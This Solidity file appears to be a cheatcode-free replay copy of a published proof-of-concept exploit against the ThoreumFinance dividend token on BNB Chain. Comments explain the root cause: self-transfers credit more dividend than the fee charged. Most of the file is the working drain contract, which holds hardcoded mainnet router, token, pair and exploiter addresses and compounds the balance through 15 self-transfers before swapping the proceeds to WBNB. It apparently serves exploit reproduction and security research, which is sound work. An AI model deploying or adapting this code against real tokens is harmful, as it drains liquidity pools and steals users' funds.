// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-01-ThoreumFinance).
// The DeFiHackLabs PoC's `Exploit` contract (test/ThoreumFinance_exp.sol)
// inherits `Test` and calls `vm.deal(address(this), 0.003 ether)` as the FIRST
// line of harvest() -- a real Foundry cheatcode call. In the non-cheatcode
// replay EVM the cheatcode address (0x7109...D12D) has no code, and Solidity's
// standard external-call codegen inserts an EXTCODESIZE guard before any
// interface call that reverts when the target has no code ("call to
// non-contract"), so the deployed `Exploit` bytecode reverts immediately on
// that line if simply redeployed as-is.
//
// This is a faithful, cheatcode-free copy of `Exploit.harvest()` with the
// `vm.deal(...)` line removed -- the equivalent effect (funding this
// contract's native balance with 0.003 BNB before the attack) is done instead
// via a `setup.steps` rawCall in the config. Logic and constants are copied
// verbatim from test/ThoreumFinance_exp.sol.
//
// Root cause: THOREUM is a dividend/rebase token whose transfer() routes a
// fee into its WBNB/THOREUM pair, swaps it to WBNB, and credits the resulting
// dividend back onto the SENDER's balance. transfer(self, balance) therefore
// both burns a fee and receives a dividend credit on the same address, and
// the credit outweighs the fee -- compounding the caller's balance ~1.7x per
// self-transfer with no external value in.

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWBNB {
    function deposit() external payable;
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface THOREUMInterface is IERC20 {
    function deposit() external payable;
    function withdraw(uint256 wad) external;
}

address constant wbnb_addr = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address constant thoreum_addr = 0xCE1b3e5087e8215876aF976032382dd338cF8401;
address constant wbnb_thoreum_lp_addr = 0xd822E1737b1180F72368B2a9EB2de22805B67E34;
address constant exploiter = 0x1285FE345523F00AB1A66ACD18d9E23D18D2e35c;
IWBNB constant wbnb = IWBNB(payable(wbnb_addr));
THOREUMInterface constant THOREUM = THOREUMInterface(thoreum_addr);
IPancakeRouter constant router = IPancakeRouter(payable(0x3a6d8cA21D1CF76F653A67577FA0D27453350dD8));

contract ThoreumDrain {
    // Faithful copy of Exploit.harvest() minus the `vm.deal(...)` cheatcode
    // line -- this contract is pre-funded with 0.003 BNB via config `setup`
    // instead, before this function is called.
    function harvest() public {
        //  step1: get some thoreum token
        wbnb.deposit{value: 0.003 ether}();
        wbnb.approve(address(router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(wbnb);
        path[1] = address(THOREUM);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            0.003 ether, 0, path, address(this), block.timestamp
        );

        //  step2: loop transfer function 15 times
        for (uint256 i = 0; i < 15; i++) {
            THOREUM.transfer(address(this), THOREUM.balanceOf(address(this)));
        }

        //step3: swap thoreum to wbnb
        THOREUM.approve(address(router), type(uint256).max);
        wbnb.approve(wbnb_thoreum_lp_addr, type(uint256).max);
        address[] memory path2 = new address[](2);
        path2[0] = address(THOREUM);
        path2[1] = address(wbnb);
        while (THOREUM.balanceOf(address(this)) > 40_000 ether) {
            router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                40_000 ether, 0, path2, exploiter, block.timestamp
            );
        }
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            THOREUM.balanceOf(address(this)), 0, path2, exploiter, block.timestamp
        );
    }

    receive() external payable {}
}
